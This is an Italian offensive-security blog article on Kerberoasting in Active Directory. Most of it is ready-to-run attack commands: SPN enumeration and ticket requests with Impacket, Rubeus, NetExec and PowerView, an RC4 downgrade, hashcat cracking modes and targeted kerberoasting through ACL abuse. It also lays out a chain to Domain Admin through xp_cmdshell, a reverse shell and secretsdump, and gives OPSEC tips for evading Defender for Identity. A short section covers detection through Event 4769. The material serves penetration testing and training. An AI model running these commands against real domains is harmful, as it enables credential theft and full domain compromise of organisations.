---
title: 'Kerberoasting: Guida Completa — SPN, TGS Cracking e Domain Admin nel 2026'
slug: kerberoasting
description: 'Kerberoasting su Active Directory: enumeration SPN con GetUserSPNs e Rubeus, downgrade RC4, hashcat, targeted kerberoasting e OPSEC reale. Da utente di dominio a credenziali privilegiate.'
image: /kerberoasting-spn-tgs-cracking-hashcat.webp
draft: true
date: 2026-06-20T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - ysoserial spn
  - kerberoasting attack 2026
  - tgs cracking hashcat
  - kerberoasting
---

# Kerberoasting: Come Funziona, Enumerazione SPN e Cracking TGS in Active Directory

## Cos'è il Kerberoasting — Per Chi Parte da Zero

In Active Directory ogni servizio di rete — SQL Server, IIS, un applicativo custom — viene registrato con un identificatore chiamato **SPN** (Service Principal Name). Quando un utente del dominio vuole accedere a quel servizio, chiede al Domain Controller un biglietto cifrato (TGS) che lo autorizza. Quel biglietto è cifrato usando la password dell'account che gestisce il servizio.

Il problema è che **qualsiasi utente del dominio, anche con i minimi privilegi, può richiedere questo biglietto**. Non serve essere amministratori. Non serve accedere al servizio. Basta essere nel dominio.

Un attaccante scarica quel biglietto cifrato sul suo sistema, poi ci lavora offline con un cracker come Hashcat — senza generare altri log, senza bloccare account, senza interagire ulteriormente con la rete. Se la password dell'account di servizio è debole, è solo questione di minuti.

È questo che rende il Kerberoasting così pericoloso: è invisibile dall'interno, usa comportamenti legittimi del protocollo Kerberos, e i service account sono notoriamente trascurati — password che non ruotano da anni, spesso con alti privilegi.

***

## Il Meccanismo Tecnico

Il flusso Kerberos legittimo che viene sfruttato:

```
1. Attacker autentica al DC con un account dominio qualsiasi
   → ottiene TGT (Ticket Granting Ticket)

2. Attacker chiede al DC un TGS (Ticket Granting Service)
   per un SPN specifico (es: MSSQLSvc/dbserver.domain.local:1433)

3. DC emette il TGS, cifrato con l'NTLM hash
   della password dell'account di servizio associato a quell'SPN

4. Attacker salva il TGS → cracking offline
   → password in chiaro dell'account di servizio
```

**Perché RC4 è il target preferito:**
Quando un TGS è cifrato con RC4\_HMAC (etype 23), la chiave di cifratura è derivata direttamente dall'NTLM hash — un MD4 non-salato. Una GPU moderna supera facilmente i 500.000 tentativi/secondo su questo formato. AES-256 (etype 18) richiede invece una derivazione PBKDF2 con salt e iterazioni — ordini di grandezza più lento da crackare.

***

## Enumerazione degli SPN

Prima di richiedere ticket, devi sapere quali account hanno SPN registrati.

### GetUserSPNs.py (Impacket) — da Linux

```bash
# Lista account kerberoastable
GetUserSPNs.py domain.local/user:Password123 -dc-ip 10.10.10.1

# Richiede subito i TGS e li salva
GetUserSPNs.py domain.local/user:Password123 -dc-ip 10.10.10.1 \
  -request -outputfile hashes.txt

# Solo un account specifico
GetUserSPNs.py domain.local/user:Password123 -dc-ip 10.10.10.1 \
  -request-user svc_mssql -outputfile hash_mssql.txt
```

### Rubeus — da Windows (in memoria, stealth)

```cmd
# Kerberoast tutti gli SPN
Rubeus.exe kerberoast /outfile:hashes.txt

# Forza RC4 downgrade (più facile da crackare)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Solo account specifico
Rubeus.exe kerberoast /user:svc_mssql /outfile:hash_mssql.txt

# Con credenziali alternate
Rubeus.exe kerberoast /creduser:user /credpassword:pass /domain:domain.local
```

### NetExec — sweep rapido di rete

```bash
nxc ldap 10.10.10.1 -u user -p Password123 --kerberoasting hashes.txt
```

### PowerView — da PowerShell

```powershell
# Enumera account con SPN
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset

# Richiedi TGS direttamente
Get-DomainSPNTicket -SPN "MSSQLSvc/dbserver.domain.local:1433" -OutputFormat Hashcat
```

***

## RC4 Downgrade: Massimizza la Craccabilità

Anche se il DC supporta AES, puoi spesso richiedere il TGS in RC4 specificando l'encryption type. Questo non è bloccato di default.

```bash
# Impacket — forza etype 23 (RC4)
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 \
  -request -outputfile hashes.txt -target-domain domain.local

# Rubeus — /rc4opsec gestisce automaticamente il downgrade
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

**Nota 2025:** Windows Server 2025 e Windows 11 24H2 disabilitano RC4 per Kerberos di default. Su ambienti moderni vedrai solo etype 18 (AES-256). La craccabilità dipende interamente dalla robustezza della password.

***

## Cracking dei TGS

### Hashcat

```bash
# RC4 (etype 23) — mode 13100
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Con regole — aumenta enormemente la copertura su password tipo "Service2024!"
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# AES-256 (etype 18) — mode 19700 — molto più lento
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt

# Benchmark per verificare velocità su tua GPU
hashcat -m 13100 -b
```

**Performance orientative su RTX 3080:**

* RC4 (etype 23): \~500.000 H/s
* AES-256 (etype 18): \~3.000 H/s

Un `Service2024!` viene crackato in secondi con regole. Una passphrase casuale di 25+ caratteri è praticamente immune.

***

## Targeted Kerberoasting

Tecnica più avanzata: se hai `GenericWrite` o `GenericAll` su un account che non ha SPN, puoi **assegnare temporaneamente un SPN** a quell'account, richiedere il TGS, crackare, poi rimuovere l'SPN.

```bash
# Via targetedKerberoast.py
python3 targetedKerberoast.py -u user -p Password123 -d domain.local \
  --dc-ip 10.10.10.1

# Pulisce automaticamente gli SPN aggiunti dopo il roast
```

Questo è particolarmente utile dopo un ACL abuse: identificato un account su cui hai GenericWrite da BloodHound, puoi kerberoastarlo anche se normalmente non sarebbe vulnerabile.

Vedi: [ACL Abuse](https://hackita.it/articoli/acl-abuse/) e [BloodHound](https://hackita.it/articoli/bloodhound/)

***

## Attack Chain Realistica: Da Utente di Dominio a Domain Admin

```
1. Accesso iniziale: qualsiasi account dominio
   (phishing, password spray, credenziali trovate)

2. GetUserSPNs.py → identifica svc_mssql con SPN registrato
   Pwdlastset: 3 anni fa → alta probabilità di password debole

3. Richiedi TGS → hashes.txt
   $krb5tgs$23$*svc_mssql$DOMAIN.LOCAL$...

4. hashcat -m 13100 → crack in 90 secondi
   Password: Mssql2019!

5. svc_mssql è membro di "SQL Admins"
   SQL Admins ha GenericAll su "Server Operators"
   Server Operators può loggare su DC

6. Da svc_mssql:
   nxc mssql DC_IP -u svc_mssql -p 'Mssql2019!' -x 'whoami'

7. xp_cmdshell → reverse shell → Server Operators → DC
   → secretsdump.py → tutti gli hash del dominio
```

Questo tipo di chain — account di servizio trascurato → privilege escalation via gruppi AD — è tra le più comuni nei pentest enterprise reali.

***

## Priorità: Quale Account Crackare Prima

Non tutti i TGS hanno lo stesso valore. Ordina per impatto potenziale:

1. **Account con alti privilegi diretti** (Domain Admins, Enterprise Admins)
2. **Account in gruppi privilegiati** (Backup Operators, Server Operators, Account Operators)
3. **Service account con accesso a più sistemi** (svc\_mssql, svc\_backup, svc\_deploy)
4. **Password vecchie** (`pwdlastset` > 1 anno → più probabile che sia debole)
5. **Account con descrizione rivelante** (spesso i sysadmin scrivono la password nella descrizione LDAP)

```bash
# Cerca account con password vecchie E SPN
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 | \
  grep -E "(svc_|service|sql|backup|deploy)"
```

***

## Differenza con AS-REP Roasting

Domanda frequente: quando uso Kerberoasting vs AS-REP Roasting?

|                             | Kerberoasting          | AS-REP Roasting                  |
| --------------------------- | ---------------------- | -------------------------------- |
| Requisito                   | Account dominio valido | Nessun account necessario        |
| Target                      | Account con SPN        | Account senza pre-autenticazione |
| Trigger                     | TGS-REQ (Event 4769)   | AS-REQ (Event 4768)              |
| Forza bruta                 | Offline sul TGS        | Offline sull'AS-REP              |
| Frequenza in ambienti reali | Alta                   | Media                            |

Vedi: [AS-REP Roasting ](https://hackita.it/articoli/as-rep-roasting/)

***

## Detection e Cosa Logga

**Event ID 4769** — Kerberos Service Ticket Request. Contiene:

* Account richiedente
* SPN richiesto
* Ticket Encryption Type (0x17 = RC4 → anomalo se AES è abilitato)

Un volume anomalo di richieste 4769 in breve tempo dallo stesso account è il segnale primario. Honeypot accounts — SPN registrati su account mai usati legittimamente — sono un detection efficace: qualsiasi 4769 su di loro è un alert immediato.

La referenza tecnica più completa sull'argomento è [HackTricks — Kerberoast](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html)

***

## OPSEC

* Richiedere TGS per decine di SPN in pochi secondi è rumoroso e triggera MDI/Defender for Identity. Distribuisci le richieste nel tempo, usa `/delay` con Rubeus.
* Preferisci `--request-user` su un singolo target ad alto valore piuttosto che il dump di massa.
* Rubeus con `/opsec` non richiede LDAP, usa solo Kerberos puro — meno tracce nel domain controller.
* Il cracking avviene offline: zero rumore sulla rete dopo l'estrazione.

```cmd
# Modalità OPSEC: no LDAP, no dump di massa, un target alla volta con delay
Rubeus.exe kerberoast /user:svc_mssql /rc4opsec /nowrap /opsec
```

***

*MITRE ATT\&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), TA0006 (Credential Access)*
